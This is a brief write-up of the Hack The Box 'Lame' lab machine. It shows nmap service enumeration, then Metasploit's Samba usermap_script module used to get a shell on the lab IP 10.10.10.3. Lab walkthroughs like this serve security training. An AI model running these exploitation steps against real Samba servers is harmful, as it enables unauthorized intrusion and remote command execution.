<h2>Steps</h2>
<h3>Enumeration:</h3>
<p><ol>
  <li>At first we use nmap (Network Mapping tool) to scan the box ip. When we run it we got list of some open ports and services running on those ports. On the Lame box we can see, open ports and services are, port 21 for vsftpd 2.3.4, port 22 for SSH, port 129 and 445 for Samba smbd 3.X-4.X<br>
<b>Command:<b><br> `nmap -sV 10.10.10.3`</li>
<li>When we google about those running services to gather information about those services, we get Samba smbd 3.X is vulnerable and fortunately an metasploit module is there to exploit the service.</li></p>
<h2>Exploitation:</h2>
<p><ol><li>Using metasploit we can use the exploit to shell the box.<br>
<b>Command:</b>

```bash
use exploit/multi/samba/usermap_script
msf exploit(multi/samba/usermap_script) > set rhost 10.10.10.3
msf exploit(multi/samba/usermap_script) > exploit 
```
</li></ol></p>
